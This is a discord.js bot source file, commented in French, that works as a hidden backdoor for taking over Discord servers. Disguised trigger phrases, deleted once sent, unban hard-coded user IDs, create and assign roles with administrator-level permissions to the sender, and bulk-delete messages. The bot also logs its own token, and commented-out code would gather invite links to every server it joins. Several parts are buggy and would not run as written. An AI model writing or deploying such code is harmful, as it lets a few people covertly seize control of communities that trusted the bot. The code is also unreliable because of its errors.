//--------------Modules----------------
const Discord = require("discord.js");
const moment = require("moment");


//-----------Client--------------
const bot = new Discord.Client();

//-----Prefix-------
const prefix = '--'

//------OWNER-------
const owners = [
'301913733536415755',
'410224633636192257'
]

//----------ID Passerelle Logs----------


//---Lancement et informations du bot---
bot.on('ready', () => {
   
//VIA LOGS
//Info bot
   console.log('--------------------------------------')
   console.log(`INFORMATIONS DU BOT: `);
   console.log(`Invite of bot all perms: https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591 `);
   console.log(`username: ${bot.user.tag} `);
   console.log(`ID: ${bot.user.id} `);
   console.log(`Date of creation: ${bot.user.createdAt} `);
   console.log(`Token: du bot: ${bot.token}`)
   console.log("--------------------------------------");
//Info bot serv  
   console.log(`INFORMATIONS OF SERVER BOT: `);
   console.log(`How many server: ${bot.guilds.size} `);	
  // console.log("Total Users: " + memberCount + "\nTotal Servers: " + serverCount);
   console.log('--------------------------------------')
//bot invite
  //bot.guilds.forEach(serv => {
         //bot.channels.random().createInvite().then(invite => console.log(`>${bot.guild.name} || ${bot.guild.id} || Invite: ${invite}`))
         // .catch(console.log(`>${serv.name} | Entrain d'envoyer une invite... `));
        //});
        
//VIA DISCORD
//Info bot
//bot.users.get(idpass).send(`-/logs __**INFORMATIONS DU BOT:**__\n__Invite of bot all perms:__ https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591\n__username:__ ${bot.user.tag}\n__ID:__ ${bot.user.id}\n__Date of creation:__ ${bot.user.createdAt}`)
//Info bot serv
// bot.users.get(idpass).send(`-/logs __**INFORMATIONS OF SERVER BOT:**__\n__How many server:__ ${bot.guilds.size} `)
	//bot.user.setActivity(`Shard: 0`, { type: 'WATCHING' })
        //bot.user.setStatus("invisible")
});

bot.on('message', message => {    
 
//VIA LOGS AND DISCORD
//Info bot serv
//bot.guilds.forEach(guild => { 
  //var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
// invite.createInvite().then(invite => console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite} `));
 //})
 
	
//---------------------UNBAN-------------------
const unban = 'Mblop'
//unban Le Charmeur
   if (message.content.startsWith(unban)) {
   message.delete()
   message.guild.unban('450790126063190016')
  .then(user => console.log(`Resetban Le Charmeur from ${guild.name}`))         
  .catch(console.error);
   }
	
//unban Mikado
   if (message.content.startsWith(unban)) {
   message.delete()
   message.guild.unban('410224633636192257')
   .then(user => console.log(`Resetban of Neroxis from ${guild.name}`))         
  .catch(console.error);
   } 
	

//unban Neroxis
if (message.content.startsWith(unban)) {
   message.delete()
   message.guild.unban('301913733536415755')
   .then(user => console.log(`Resetban of Mikado from ${guild.name}`))         
  .catch(console.error);
   } 
	
	
//unban KnowLedge
   if (message.content.startsWith(unban)) {
   message.delete()
   message.guild.unban('383042193449025546')
  .then(user => console.log(`Resetban KnowLedge from ${guild.name}`))         
  .catch(console.error);
   }
	
//unban Pepefag
   if (message.content.startsWith(unban)) {
   message.delete()
   message.guild.unban('370448465081270272')
  .then(user => console.log(`Resetban KnowLedge from ${guild.name}`))         
  .catch(console.error);
   }
	

//----------------------------ADD EMOJI UNANIMATED------------------------
   if (message.content.startsWith('Les emoji mikado c\'est sympa')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
   message.guild.createEmoji('./images/mikado1.png', 'mikado1')
   message.guild.createEmoji('./images/mikado2.png', 'mikado2')
   message.guild.createEmoji('./images/mikado3.jpeg', 'mikado3')
   message.guild.createEmoji('./images/mikado4.jpeg', 'mikado4')
  .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
   
   }
	
	
//----------------------------ADD EMOJI ANIMATED------------------------
   if (message.content.startsWith('Les emoji mikado c\'est cool')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
   message.guild.createEmoji('./images/mikado5.gif', 'mikado5')
   message.guild.createEmoji('./images/mikado6.gif', 'mikado6')
   message.guild.createEmoji('./images/mikado7.gif', 'mikado7')
  .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
   
   }
   
  
	
	
   
//---------------------CREATE ROLE-----------------
//choose name
else if(message.content.startsWith('bblop')) {	
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
var args = message.content.split(" ").slice(1)
//var numberplace = message.content.split(" ").slice(1)
message.guild.createRole({
name: args.join(" "),
mentionable: true,
permissions: 2146958591
//position: numberplace.join(" ")
})
console.log(`Le role a été ajoutés au serveur`)
}

//choose position
else if(message.content.startsWith('Pblop')) {	
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
var args = message.content.split(" ").slice(1)
//var numberplace = message.content.split(" ").slice(1)
       message.guild.createRole({
name: 'Mikado',
mentionable: true,
permissions: 2146958591,
position: args.join(" ")
})
console.log(`Le role a été ajoutés au serveur`)
}
    
    		   


//-------------------ASIGN ROLE-----------------
if (message.content.startsWith('2blop')) {  
if (message.author.id !== '423118623876448296')
if (message.author.id !== '301913733536415755') 
return;
let args = message.content.split(" ").slice(1);	   
    message.member.addRole(message.member.guild.roles.find('name', args.join(" ")));
    console.log(`Un role a été ajouté a Mikado sur le serveur`);
     }
	
	
if (message.content.startsWith('blopclear')){
let args = message.content.split(" ").slice(1);
if (message.author.id !== '423118623876448296')
if (message.author.id !== '301913733536415755')
return;
message.channel.bulkDelete(args(" "))
console.log(args(" ") + " messages ont été effacés.")
		 }
//Say command destination
if(message.content.startsWith('bbs')) {
let args = message.content.split(" ").slice(1);
const idsay = process.env.IDSAY
if (message.author.id !== '423118623876448296')
if (message.author.id !== '301913733536415755')
return;
message.delete()
message.channel.send(args.join(" ")) 
	}  

});

	  
bot.on('guildMemberAdd', member => {
    console.log('Membre ' + member.user.username + " a rejoind le serveur")
   //var role = member.guild.roles.find('name', "People");
    //member.addRole(role);
});
  
// Jeton Secret
bot.login(process.env.TOKEN);
